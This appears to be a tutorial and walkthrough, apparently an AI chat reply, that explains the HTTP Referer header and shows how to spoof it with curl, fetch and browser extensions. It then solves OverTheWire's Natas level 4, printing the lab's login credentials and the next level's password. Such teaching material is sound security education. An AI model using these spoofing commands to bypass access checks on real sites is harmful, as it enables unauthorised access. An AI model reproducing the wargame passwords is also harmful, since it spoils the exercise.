## What is the **Referrer** Header?

The `Referrer`is an **HTTP request header** sent by the browser to indicate the **URL of the page** that linked to the current request.

### Example:

If you click a link from:

```
http://example.com/page.html
```

to:

```
http://target.com/welcome
```

Then the browser sends this request to `target.com`:

```http
GET /welcome HTTP/1.1
Host: target.com
Referer: http://example.com/page.html
```



## What Is It Used For?

| Purpose                          | How It's Used                                  |
| -------------------------------- | ---------------------------------------------- |
| Analytics                        | See where traffic is coming from               |
| Access control (not recommended) | Restrict access to pages based on referrer     |
| Security filters (CSRF)          | Block form submissions not from trusted origin |
| Debugging                        | Help developers trace the user path            |



## Why It's Weak (and Easily Spoofed)

### The Problem:

* **The client (browser or script) controls it.**
* **Anyone can change it manually.**

That means **you should never trust the `Referer` header to enforce security decisions** — because an attacker can forge it.



## How to Spoof the Referer Header

### 1. **Using curl:**

```bash
curl -H "Referer: http://trusted-site.com/" http://target.com/protected
```

### 2. **Using JavaScript (in devtools):**

```js
fetch('http://target.com/protected', {
  headers: {
    'Referer': 'http://trusted-site.com/'
  }
})
```

### 3. **Using browser extensions:**

* Extensions like **ModHeader** or **Header Editor** let you override headers like `Referer`, `User-Agent`, `Origin`, etc.



##  Real-World Example

### Bad:

```php
if ($_SERVER['HTTP_REFERER'] !== 'http://mybank.com/dashboard') {
  die("Access denied");
}
```

Any attacker can bypass this check by modifying the Referer.


### Better:

Use real authentication:

* **Cookies** with session IDs
* **JWT tokens**
* **OAuth** or **API keys**


##  Step 3: Analyze the Hint

Look at the page source (View Source or `curl`):

```bash
curl -u natas4:QryZXc2e0zahULdHrTHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/
```

You’ll find:

```html
<!-- Access disallowed. You are visiting from an untrusted site. -->
```

So this level is checking the **Referer header**.



## Step 4: Bypass Using the Right Referer

Try sending a request with the following header:

```
Referer: http://natas5.natas.labs.overthewire.org/
```

### Use curl:

```bash
curl -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  -u natas4:QryZXc2e0zahULdHrTHxzyYkj59kUxLQ \
  http://natas4.natas.labs.overthewire.org/
```

This will return a **new page** with the password to **natas5**.


## Step 5: Extract the Password

You’ll get output like:

```html
<div id="content">
The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
</div>
```



This level teaches:

* Relying on `Referer` headers for access control is weak.
* `Referer` headers are easily spoofed by the client.
* You should never trust headers as a source of **authorization** without validation on the server side.



| Target         | Value                                                                                |
| -------------- | ------------------------------------------------------------------------------------ |
| **Next Level** | `natas5`                                                                             |
| **Password**   | *(from curl response above)*                                                         |
| **URL**        | [http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org) |

![image](https://github.com/user-attachments/assets/49a7c3f6-ee0c-4188-b830-e1b78d730a6e)




##  Summary

| Property     | Description                                            |
| ------------ | ------------------------------------------------------ |
| Header Name  | `Referer` (misspelled in HTTP spec)                    |
| Function     | Indicates the previous page making the request         |
| Spoofability | Easily spoofed – it's client-controlled                |
| Trust level  | 🔴 Not trustworthy for security decisions              |
| Use case     | OK for analytics/debugging, **not** for access control |

---

Let me know if you want a demo script to test spoofing headers, or if you're ready to start testing **Natas5** — where cookies become the focus.
